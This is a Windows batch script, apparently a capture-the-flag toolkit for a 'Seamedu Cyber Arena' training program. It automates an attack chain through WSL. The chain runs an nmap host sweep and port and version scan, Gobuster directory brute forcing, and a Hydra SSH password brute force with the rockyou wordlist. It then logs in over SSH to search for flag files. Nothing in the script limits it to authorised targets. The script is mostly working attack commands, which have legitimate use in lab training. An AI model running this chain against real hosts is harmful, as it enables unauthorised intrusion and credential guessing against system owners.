@echo off
REM Seamedu Cyber Arena - Ethical Hacking Automation Script for Windows (using WSL)

echo ---------------------------------------------------
echo   🚀 Seamedu Cyber Arena - Windows Batch Toolkit
echo ---------------------------------------------------

REM Ensure WSL is installed
where wsl >nul 2>&1
if %errorlevel% neq 0 (
    echo ❌ WSL is not installed. Please install Windows Subsystem for Linux.
    pause
    exit /b
)

REM Ask user for subnet to scan
set /p subnet="Enter subnet to scan (e.g., 192.168.1.0/24): "
echo 🔍 Running network scan on %subnet%...
wsl nmap -sn %subnet% -oG live_hosts.txt
echo ✅ Live hosts saved to live_hosts.txt

REM Extract live IPs
wsl cat live_hosts.txt | wsl grep Up | wsl awk "{print $2}" > hosts.txt
echo.
echo 🔍 Discovered IPs:
type hosts.txt

REM Ask user for target IP
set /p target_ip="Enter target IP from above: "

REM Perform port scan
echo 🔎 Scanning open ports on %target_ip%...
wsl nmap -sS -sV -oN port_scan_%target_ip%.txt %target_ip%
echo ✅ Port scan saved to port_scan_%target_ip%.txt

REM Run Gobuster
set /p url="Enter target website URL (e.g., http://%target_ip%): "
echo 🕷️ Running directory brute force with Gobuster...
wsl gobuster dir -u %url% -w /usr/share/wordlists/dirb/common.txt -o gobuster_%target_ip%.txt
echo ✅ Gobuster results saved to gobuster_%target_ip%.txt

REM SSH Brute-force with Hydra
set /p ssh_user="Enter SSH username: "
echo 🔐 Starting SSH brute-force with Hydra...
wsl hydra -l %ssh_user% -P /usr/share/wordlists/rockyou.txt ssh://%target_ip% -o hydra_%target_ip%.txt
echo ✅ Hydra results saved to hydra_%target_ip%.txt

REM Search for flag files
echo 📂 Searching for flag files via SSH...
wsl ssh %ssh_user%@%target_ip% "find / -type f -iname '*flag*' 2>/dev/null" > found_flags.txt
echo ✅ Flag locations saved to found_flags.txt

echo ---------------------------------------------------
echo ✅ All operations completed! Review the output files.
pause
